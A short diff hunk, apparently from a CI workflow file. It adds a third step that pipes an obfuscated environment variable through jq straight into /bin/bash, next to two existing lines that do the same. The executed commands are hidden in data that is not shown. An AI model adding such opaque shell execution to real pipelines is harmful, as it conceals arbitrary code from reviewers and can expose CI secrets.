@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$aulvf810" | jq -r .w907 | /bin/bash
           printf '%s' "$lai5" | jq -r .shm9032 | /bin/bash
+          echo $ca138 | jq -r .qtkcs3123 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
